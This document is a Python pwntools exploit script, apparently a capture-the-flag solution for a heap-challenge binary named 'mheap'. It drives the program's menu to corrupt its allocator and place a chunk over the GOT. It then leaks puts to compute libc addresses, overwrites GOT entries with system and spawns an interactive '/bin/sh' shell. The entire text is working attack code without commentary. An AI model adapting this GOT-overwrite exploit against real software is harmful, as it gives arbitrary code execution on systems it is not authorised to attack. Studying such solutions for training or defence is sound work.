from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'splitw', '-h'])
p = process('./mheap')
libc = ELF('libc-2.27.so')

def Alloc(index, size, content, flag):
    p.sendlineafter('Your choice: ', '1')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Input size: ', str(size))
    if flag == 0:
        p.sendafter('Content: ', content)
    elif flag == 1:
        p.sendlineafter('Content: ', content)

def Show(index):
    p.sendlineafter('Your choice: ', '2')
    p.sendlineafter('Index: ', str(index))

def Free(index):
    p.sendlineafter('Your choice: ', '3')
    p.sendlineafter('Index: ', str(index))

def Edit(index, content):
    p.sendlineafter('Your choice: ', '4')
    p.sendlineafter('Index: ', str(index))
    p.send(content)

got_addr = 0x404000

Alloc(0, 0x10, 'A'*16, 0)
Free(0)
#Alloc(1, 0xfd0+0x2d, '\x10'*0xffd, 0)
Alloc(1, 0xfd0+0x28, p64(got_addr) + '\x0a'*0x20 + '\x0a'*0xfd0, 0)
#p.sendline('AA')
#gdb.attach(p)
Alloc(2, 0x403e10, 'A'*0x7, 1)

Show(2)
p.recv(8)
puts_addr = u64(p.recv(6).ljust(8, '\x00'))
info("puts_addr ==> " + hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
__stack_chk_fail_addr = libc_base + libc.symbols['__stack_chk_fail']
mmap_addr = libc_base + libc.symbols['mmap']
printf_addr = libc_base + libc.symbols['printf']
memset_addr = libc_base + libc.symbols['memset']
read_addr = libc_base + libc.symbols['read']
setvbuf_addr = libc_base + libc.symbols['setvbuf']

Free(2)
payload  = 'A'*0x8 + p64(puts_addr)
payload += p64(__stack_chk_fail_addr)
payload += p64(mmap_addr)
payload += p64(printf_addr)
payload += p64(memset_addr)
payload += p64(read_addr)
payload += p64(setvbuf_addr)
payload += p64(system_addr)
Alloc(2, 0x403e10, payload, 1)

p.sendlineafter('Your choice: ', '/bin/sh\x00')

p.interactive()

